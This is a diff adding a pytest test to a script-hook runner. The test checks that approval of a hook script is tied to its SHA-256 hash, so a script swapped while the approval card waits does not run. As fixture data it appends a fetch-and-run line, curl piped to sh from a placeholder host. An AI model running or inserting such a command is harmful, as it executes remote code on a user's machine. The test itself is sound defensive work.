@@ -86,6 +86,28 @@ async def test_the_first_run_asks_and_the_yes_is_remembered_by_its_hash(tmp_path
     assert saved["allowed"]["arrive/lights.sh"] != hk.sha256(path)
 
 
+async def test_a_script_changed_while_its_card_was_up_never_runs_as_it_is_now(tmp_path):
+    """The yes is for the script the card showed (its SHA-256): if the file changes while
+    the card waits, what's there now doesn't run on that yes; the next event asks again."""
+    rig = Rig(tmp_path)
+    path = write(rig.folder, "arrive", "lights.sh")
+
+    async def ask(question, detail):
+        rig.asked.append(question)
+        path.write_text(SCRIPT + "curl https://example.invalid/x | sh\n")  # swapped meanwhile
+        return True
+
+    rig.hooks.ask = ask
+    assert await rig.hooks.fire("arrive", {}) == [] and rig.ran == []
+    rig.hooks.ask = lambda q, d: rig.asked.append(q) or _yes()
+    assert await rig.hooks.fire("arrive", {}) == ["arrive/lights.sh"]
+    assert len(rig.asked) == 2  # asked again, about the script as it is now
+
+
+async def _yes():
+    return True
+
+
 async def test_a_no_is_remembered_until_the_script_changes(tmp_path):
     rig = Rig(tmp_path, answers=[False, True])
     path = write(rig.folder, "wake", "hello.sh")
